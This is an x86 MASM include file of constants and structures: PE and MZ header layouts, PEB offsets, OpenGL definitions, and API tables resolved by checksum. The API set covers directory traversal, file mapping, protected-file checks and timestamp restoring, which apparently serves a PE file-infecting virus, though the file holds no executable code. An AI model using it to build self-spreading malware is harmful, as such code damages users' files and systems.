pebImageBaseAddress             equ     8
pebLdr                          equ     0ch

ldrInLoadOrderModuleList        equ     0ch

mlDllBase                       equ     18h

PAGE_READWRITE                  equ     4
PAGE_EXECUTE_READWRITE          equ     40h
MEM_COMMIT                      equ     1000h

outpid          equ     0
codeid          equ     4
xlatid          equ     8

textb           equ     0
texta           equ     4

CS_OWNDC        equ     20h
WS_MAXIMIZEBOX	equ     10000h
WS_MINIMIZEBOX  equ     20000h
WS_THICKFRAME   equ     40000h
WS_SYSMENU      equ     80000h
WS_CAPTION      equ     0C00000h
WS_CLIPCHILDREN equ     2000000h
WS_CLIPSIBLINGS equ     4000000h

PFD_DRAW_TO_WINDOW      equ     4
PFD_SUPPORT_OPENGL      equ     20h

GL_QUADS                        equ     0007h
GL_FRONT                        equ     0404h
GL_FLOAT                        equ     1406h
GL_MODELVIEW                    equ     1700h
GL_PROJECTION                   equ     1701h
GL_RGBA                         equ     1908h
GL_FILL                         equ     1B02h
GL_REPLACE                      equ     1E01h
GL_TEXTURE_ENV_MODE             equ     2200h
GL_TEXTURE_ENV                  equ     2300h
GL_NEAREST                      equ     2600h
GL_TEXTURE_MAG_FILTER           equ     2800h
GL_TEXTURE_MIN_FILTER           equ     2801h
GL_TEXTURE_WRAP_S               equ     2802h
GL_TEXTURE_WRAP_T               equ     2803h
GL_CLAMP                        equ     2900h
GL_TEXTURE0                     equ     84C0h
GL_TEXTURE1                     equ     84C1h
GL_TEXTURE_RECTANGLE_ARB        equ     84F5h
GL_FRAGMENT_PROGRAM_ARB         equ     8804h
GL_RGBA32F_ARB                  equ     8814h
GL_FRAGMENT_SHADER_ARB          equ     8B30h
GL_COLOR_ATTACHMENT0_EXT        equ     8CE0h
GL_COLOR_ATTACHMENT1_EXT        equ     8CE1h
GL_FRAMEBUFFER_EXT              equ     8D40h

MAX_PATH                        equ     260

FILE_ATTRIBUTE_DIRECTORY        equ     00000010h

GMEM_FIXED                      equ     0000h
;GMEM_ZEROINIT                   equ     0040h

;CREATE_ALWAYS                   equ     2
OPEN_EXISTING                   equ     3

;FILE_SHARE_READ                 equ     1
;FILE_SHARE_WRITE                equ     2

GENERIC_WRITE                   equ     40000000h
GENERIC_READ                    equ     80000000h

IMAGE_FILE_MACHINE_I386         equ     14ch    ;14d/14e do not exist.  if you don't believe, then try it

IMAGE_FILE_RELOCS_STRIPPED      equ     0001h
IMAGE_FILE_EXECUTABLE_IMAGE     equ     0002h
IMAGE_FILE_32BIT_MACHINE        equ     0100h
IMAGE_FILE_SYSTEM               equ     1000h
IMAGE_FILE_DLL                  equ     2000h
IMAGE_FILE_UP_SYSTEM_ONLY       equ     4000h

IMAGE_SUBSYSTEM_WINDOWS_GUI     equ     2
IMAGE_SUBSYSTEM_WINDOWS_CUI     equ     3

RANDPADMIN                      equ     4096
RANDPADMAX                      equ     2048 ;RANDPADMIN is added to this

IMAGE_SCN_MEM_EXECUTE           equ     20000000h
IMAGE_SCN_MEM_WRITE             equ     80000000h

SECTION_MAP_WRITE               equ     0002h

FILE_MAP_WRITE                  equ     SECTION_MAP_WRITE

align           1                               ;byte-packed structures
krncrcstk       struct
        kVirtualAlloc           dd      ?
        kLoadLibraryA           dd      ?
        kGetProcAddress         dd      ?
        kGetModuleHandleA       dd      ?
krncrcstk       ends
krncrc_count    equ     size krncrcstk shr 2

glucrcstk       struct
        glgluOrtho2D    dd      ?
glucrcstk       ends
glucrc_count    equ     size glucrcstk shr 2

gdicrcstk       struct
        gSetPixelFormat         dd      ?
        gChoosePixelFormat      dd      ?
gdicrcstk       ends
gdicrc_count    equ     size gdicrcstk shr 2

usrcrcstk       struct
        uReleaseDC              dd      ?
        uGetDC                  dd      ?
        uDestroyWindow          dd      ?
        uDefWindowProcA         dd      ?
        uCreateWindowExA        dd      ?
usrcrcstk       ends
usrcrc_count    equ     size usrcrcstk shr 2

oglcrcstk       struct
        owglMakeCurrent         dd      ?
        owglGetProcAddress      dd      ?
        owglDeleteContext       dd      ?
        owglCreateContext       dd      ?
        oglViewport             dd      ?
        oglVertex2f             dd      ?
ife MODE_ATI
        oglTexSubImage2D        dd      ?
endif
        oglTexParameteri        dd      ?
        oglTexImage2D           dd      ?
        oglTexEnvi              dd      ?
        oglTexCoord2f           dd      ?
        oglReadPixels           dd      ?
        oglReadBuffer           dd      ?
if MODE_ATI
        oglRasterPos2i          dd      ?
endif
        oglMatrixMode           dd      ?
        oglLoadIdentity         dd      ?
        oglGenTextures          dd      ?
        oglEnd                  dd      ?
if MODE_ATI
        oglDrawPixels           dd      ?
endif
        oglDrawBuffer           dd      ?
        oglDeleteTextures       dd      ?
        oglBindTexture          dd      ?
        oglBegin                dd      ?
oglcrcstk       ends
oglcrc_count    equ     size oglcrcstk shr 2

wglcrcstk       struct
        wglcloc                         dd      ?
        wglbloc                         dd      ?
        wglaloc                         dd      ?
        wglshader                       dd      ?
        wglprogram                      dd      ?
        wgltextids                      dd      3 dup (?)
        wglfb                           dd      ?
        wglUseProgram                   dd      ?
        wglUniform1i                    dd      ?
        wglUniform1f                    dd      ?
        wglShaderSource                 dd      ?
        wglLinkProgram                  dd      ?
        wglGetUniformLocation           dd      ?
        wglGenFramebuffersEXT           dd      ?
        wglFramebufferTexture2DEXT      dd      ?
        wglDetachShader                 dd      ?
        wglDeleteShader                 dd      ?
        wglDeleteProgram                dd      ?
        wglDeleteFramebuffersEXT        dd      ?
        wglCreateShader                 dd      ?
        wglCreateProgram                dd      ?
        wglCompileShader                dd      ?
        wglBindFramebufferEXT           dd      ?
        wglAttachShader                 dd      ?
        wglActiveTexture                dd      ?
        wgltexts                        dd      2 dup (?) ;pushed from other location
        wglctxhnd                       dd      ? ;pushed from other location
        wglwndhnd                       dd      ? ;pushed from other location
        wgldchnd                        dd      ? ;pushed from other location
wglcrcstk       ends

statelen                        equ     624
period                          equ     397

tshiftU                         equ     0bh
tshiftS                         equ     7
tmaskB                          equ     9d2c5680h
tshiftT                         equ     0fh
tmaskC                          equ     0efc60000h
tshiftL                         equ     12h
matrixA                         equ     9908b0dfh

krncrcstk2      struct
        k2SfcIsFileProtected    dd      ?       ;appended from other location
        k2UnmapViewOfFile       dd      ?
        k2SetFileTime           dd      ?
        k2SetFileAttributesW    dd      ?
        k2SetFileAttributesA    dd      ?
        k2SetCurrentDirectoryW  dd      ?
        k2SetCurrentDirectoryA  dd      ?
        k2MultiByteToWideChar   dd      ?
        k2MapViewOfFile         dd      ?
        k2LoadLibraryA          dd      ?
        k2GlobalFree            dd      ?
        k2GlobalAlloc           dd      ?
        k2GetVersion            dd      ?
        k2GetTickCount          dd      ?
        k2GetFullPathNameW      dd      ?
        k2GetFullPathNameA      dd      ?
        k2FindNextFileW         dd      ?
        k2FindNextFileA         dd      ?
        k2FindFirstFileW        dd      ?
        k2FindFirstFileA        dd      ?
        k2FindClose             dd      ?
        k2CreateFileMappingA    dd      ?
        k2CreateFileW           dd      ?
        k2CreateFileA           dd      ?
        k2CloseHandle           dd      ?
krncrcstk2      ends
krncrc_count2   equ     (size krncrcstk2 - 4) shr 2

FILETIME        struct
        dwLowDateTime   dd      ?
        dwHighDateTime  dd      ?
FILETIME        ends

WIN32_FIND_DATA struct
        dwFileAttributes        dd              ?
        ftCreationTime          FILETIME        <?>
        ftLastAccessTime        FILETIME        <?>
        ftLastWriteTime         FILETIME        <?>
        dwFileSizeHigh          dd              ?
        dwFileSizeLow           dd              ?
        dwReserved0             dd              ?
        dwReserved1             dd              ?
        cFileName               dw              260 dup (?)
        cAlternateFileName      dw              14 dup (?)
WIN32_FIND_DATA ends

findlist        struct
        findprev        dd                      ?
        findhand        dd                      ?
        finddata        WIN32_FIND_DATA         <?>
findlist        ends

coffhdr         struct
        pemachine       dw      ?               ;04
        pesectcount     dw      ?               ;06
        petimedate      dd      ?               ;08
        pesymbrva       dd      ?               ;0C
        pesymbcount     dd      ?               ;10
        peopthdrsize    dw      ?               ;14
        peflags         dw      ?               ;16
coffhdr         ends

pedir           struct
        dirrva          dd      ?
        dirsize         dd      ?
pedir           ends

pehdr           struct
        pesig           dd      ?               ;00
        pecoff          coffhdr <?>
        pemagic         dw      ?               ;18
        pemajorlink     db      ?               ;1A
        peminorlink     db      ?               ;1B
        pecodesize      dd      ?               ;1C
        peidatasize     dd      ?               ;20
        peudatasize     dd      ?               ;24
        peentrypoint    dd      ?               ;28
        pecodebase      dd      ?               ;2C
        pedatabase      dd      ?               ;30
        peimagebase     dd      ?               ;34
        pesectalign     dd      ?               ;38
        pefilealign     dd      ?               ;3C
        pemajoros       dw      ?               ;40
        peminoros       dw      ?               ;42
        pemajorimage    dw      ?               ;44
        peminorimage    dw      ?               ;46
        pemajorsubsys   dw      ?               ;48
        peminorsubsys   dw      ?               ;4A
        pereserved      dd      ?               ;4C
        peimagesize     dd      ?               ;50
        pehdrsize       dd      ?               ;54
        pechksum        dd      ?               ;58
        pesubsys        dw      ?               ;5C
        pedllflags      dw      ?               ;5E
        pestackmax      dd      ?               ;60
        pestacksize     dd      ?               ;64
        peheapmax       dd      ?               ;68
        peheapsize      dd      ?               ;6C
        peldrflags      dd      ?               ;70
        pervacount      dd      ?               ;74
        peexport        pedir   <?>             ;78
        peimport        pedir   <?>             ;80
        persrc          pedir   <?>             ;88
        peexcpt         pedir   <?>             ;90
        pesecurity      pedir   <?>             ;98
        pereloc         pedir   <?>             ;A0
        pedebug         pedir   <?>             ;A8
        pearch          pedir   <?>             ;B0
        peglobal        pedir   <?>             ;B8
        petls           pedir   <?>             ;C0
        peconfig        pedir   <?>             ;C8
        pebound         pedir   <?>             ;D0
        peiat           pedir   <?>             ;D8
        pedelay         pedir   <?>             ;E0
        pecom           pedir   <?>             ;E8
        persrv          pedir   <?>             ;F0
pehdr           ends

peexp           struct
        expflags        dd      ?
        expdatetime     dd      ?
        expmajorver     dw      ?
        expminorver     dw      ?
        expdllrva       dd      ?
        expordbase      dd      ?
        expadrcount     dd      ?
        expnamecount    dd      ?
        expadrrva       dd      ?
        expnamerva      dd      ?
        expordrva       dd      ?
peexp           ends

mzhdr           struct
        mzsig           dw      ?               ;00
        mzpagemod       dw      ?               ;02
        mzpagediv       dw      ?               ;04
        mzrelocs        dw      ?               ;06
        mzhdrsize       dw      ?               ;08
        mzminalloc      dw      ?               ;0A
        mzmaxalloc      dw      ?               ;0C
        mzss            dw      ?               ;0E
        mzsp            dw      ?               ;10
        mzchksum        dw      ?               ;12
        mzip            dw      ?               ;14
        mzcs            dw      ?               ;16
        mzreloff        dw      ?               ;18
        mzfiller        db      22h dup (?)     ;1A
        mzlfanew        dd      ?               ;3C
mzhdr           ends

PIXELFORMATDESCRIPTOR	struc
        pfd_nSize               dw      ?
        pfd_nVersion            dw      ?
        pfd_dwFlags		dd      ?
        pfd_iPixelType          db      ?
        pfd_cColorBits          db      ?
        pfd_cRedBits            db      ?
        pfd_cRedShift           db      ?
        pfd_cGreenBits          db      ?
        pfd_cGreenShift         db      ?
        pfd_cBlueBits           db      ?
        pfd_cBlueShift          db      ?
        pfd_cAlphaBits          db      ?
        pfd_cAlphaShift         db      ?
        pfd_cAccumBits          db      ?
        pfd_cAccumRedBits       db      ?
        pfd_cAccumGreenBits     db      ?
        pfd_cAccumBlueBits      db      ?
        pfd_cAccumAlphaBits     db      ?
        pfd_cDepthBits          db      ?
        pfd_cStencilBits        db      ?
        pfd_cAuxBuffers         db      ?
        pfd_iLayerType          db      ?
        pfd_bReserved           db      ?
        pfd_dwLayerMask         dd      ?
        pfd_dwVisibleMask	dd      ?
        pfd_dwDamageMask        dd      ?
PIXELFORMATDESCRIPTOR	ends

pesect          struct
        sectname        db      8 dup (?)
        sectvirtsize    dd      ?
        sectvirtaddr    dd      ?
        sectrawsize     dd      ?
        sectrawaddr     dd      ?
        sectreladdr     dd      ?
        sectlineaddr    dd      ?
        sectrelcount    dw      ?
        sectlinecount   dw      ?
        sectflags       dd      ?
pesect          ends

mapsehstk       struct
        mapsehprev      dd      ?
        mapsehexcpt     dd      ?
        mapsehregedi    dd      ?
        mapsehregesi    dd      ?
        mapsehregebp    dd      ?
        mapsehregesp    dd      ?
        mapsehregebx    dd      ?
        mapsehregedx    dd      ?
        mapsehregecx    dd      ?
        mapsehregeax    dd      ?
        mapsehsehret    dd      ?
        mapsehinfret    dd      ?
mapsehstk       ends

mapstack        struct
        mapfilesize     dd      ?
        mapmapret       dd      ?
        mapinfret       dd      ?
        mapattrib       dd      ?
mapstack        ends
align
